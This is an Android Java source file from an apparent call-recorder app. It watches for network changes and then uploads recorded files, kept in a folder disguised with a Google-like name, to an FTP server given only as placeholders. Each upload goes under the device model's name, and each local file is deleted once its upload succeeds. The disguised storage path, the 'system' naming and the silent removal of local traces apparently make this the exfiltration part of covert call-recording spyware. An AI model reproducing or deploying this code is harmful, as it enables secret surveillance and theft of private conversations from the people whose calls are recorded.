package com.sbdev.callrecorderpro;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPFile;

import java.io.File;
import java.io.FileInputStream;

/**
 * Created by Sharn25 on 2/25/2018.
 * This class is used to upload recorded files to specified ftp server by using AsyncTask.
 * void programs in this class
 *  startuploadftp - help to add broadcasting intent filters to service for runing the program only when network states are changed
 *                 - Calls uploadreceiver, which run upload function
 *  startsystemservcie - Starts service for upload to FTP(this) class
 *  upload - upload the contents of directory to ftp server
 *
 */

public class SystemUp {
    public String stackTrace;//Error Collecting String
    public String[] filenames;//String for file names in folder
    private UpdateReceiver updatereceiver;//Dynamic broadcast recevier

    public void startuploadftp(Context mcontext){
        IntentFilter intentFilterup = new IntentFilter();
        intentFilterup.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        if (updatereceiver == null) {
            updatereceiver = new UpdateReceiver();
        }
        mcontext.registerReceiver(updatereceiver, intentFilterup);
    }

    public void startsystemservcie(Context mcontext){//Start Upload program as service.
        Intent intent =new Intent(mcontext, SystemUpService.class);
        mcontext.startService(intent);
    }

    public void upload(Context mcontext){//Upload too FTP Server
        AsyncTaskRunner runner = new AsyncTaskRunner();
        String path = Environment.getExternalStorageDirectory().toString()+"/Android/data/com.google.file";

        File directory = new File(path);
        File[] files = directory.listFiles();

        if(!(files==null)){
            filenames = new String[files.length];
            for (int i = 0; i < files.length; i++)
            {
                filenames[i] = files[i].getName();
            }
            runner.execute(filenames);}

    }

    private class AsyncTaskRunner extends AsyncTask<String, String, String> {
        FTPClient con;
        @Override
        protected String doInBackground(String... params) {
            publishProgress("Sleeping..."); // Calls onProgressUpdate()
            try
            {
                con = new FTPClient();
                con.connect("Your_FTP_Server_Addess");//Enter Your FTP Server address here
                if (con.login("UserName", "Password")) {//Enter UserName and password off your FTP Server
                    con.enterLocalPassiveMode(); // important!
                    con.setFileType(FTP.BINARY_FILE_TYPE);
                    boolean directryexist= con.changeWorkingDirectory(Build.MODEL);
                    if (!(directryexist)){
                        con.makeDirectory(Build.MODEL);
                        con.changeWorkingDirectory(Build.MODEL);
                    }
                    String workdirectory="/" + Build.MODEL + "/";
                    FTPFile[] files = con.listFiles();
                    boolean result;
                    String data2;
                    boolean chk;
                    ///*----Check Existing file in server. But with file increase in server it starts creating problem.
                    for (int i = 0; i < params.length; i++) {
                        chk=false;
                        for(int j=0; j<files.length; j++){
                            String s1=files[j].getName();
                            String s2=params[i];
                            if(s1.intern()==s2.intern()) {
                                chk=true;
                            }
                        }
                        if(!(chk)){//*/// End of checking file and return true if exist.
                            data2 = Environment.getExternalStorageDirectory().toString() + "/Android/data/com.google.file/" + params[i];
                            FileInputStream in = new FileInputStream(new File(data2));
                            result = con.storeFile(workdirectory + params[i], in);
                            in.close();
                            if (result){
                                File file = new File(data2);
                                file.delete();
                            }
                        }//End of if which Exceute with help of "chk" boolean.
                        result=false;
                    }
                }
                con.logout();
                con.disconnect();
            } catch (Exception e){
                stackTrace = Log.getStackTraceString(e);
            }
            return stackTrace;
        }
        @Override
        protected void onPostExecute(String result) {
        }

        @Override
        protected void onPreExecute() {
        }

        @Override
        protected void onProgressUpdate(String... text) {
        }
    }
}
